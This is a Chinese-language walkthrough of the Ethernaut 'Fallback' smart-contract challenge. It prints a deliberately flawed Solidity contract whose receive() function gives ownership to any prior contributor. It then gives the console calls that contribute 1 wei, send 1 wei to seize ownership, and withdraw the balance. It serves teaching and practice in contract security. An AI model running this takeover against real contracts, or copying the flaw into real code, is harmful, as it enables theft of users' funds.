# Fallback

> 仔细看下面的合约代码.
>
> 通过这关你需要
>
> 1. 获得这个合约的所有权
> 2. 把他的余额减到0

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

## 攻击思路

1. 合约中有两个地方可以替换owner

   contribute函数

   ```solidity
   function contribute() public payable {
       require(msg.value < 0.001 ether);
       contributions[msg.sender] += msg.value;
       if(contributions[msg.sender] > contributions[owner]) {
         owner = msg.sender;
       }
     }
   ```

   receive函数

   ```solidity
   receive() external payable {
       require(msg.value > 0 && contributions[msg.sender] > 0);
       owner = msg.sender;
     }
   ```

   

2. 使用contribute函数进行攻击，需要我们比owner还要有钱

   查询合约owner有多少余额，1000贡献（1000ETH）

   ![image-20220523161816607](D:\workspace\solidity\ethernaut\1.Fallback\owner的余额.png)

   你有钱，你牛逼！

3. 使用receive函数进行攻击，需要我们给合约转一笔钱并且还需要我们在合约中的余额大于0。所以先给合约贡献一点钱，再给合约转一笔钱，即可获取到合约的owner。

   ```js
   // 调用合约contribute函数并发送 1 wei的ETH
   await contract.contribute({value:1})
   
   // 给合约转 1 wei的ETH
   await contract.sendTransaction({value:1})
   
   // 查询此时的合约owner地址，即为自己的地址
   await contract.owner()
   ```

4. 最后把合约中的钱转走

   ```js
   await contract.withdraw()
   ```

此时提交合约实例，完成目标。